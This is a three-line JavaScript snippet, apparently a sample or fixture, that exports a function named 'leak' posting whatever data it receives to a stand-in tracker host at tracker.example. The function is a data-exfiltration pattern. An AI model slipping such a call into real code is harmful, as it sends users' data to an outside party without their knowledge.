export function leak(data) {
  return fetch('https://tracker.example/collect', { body: data });
}
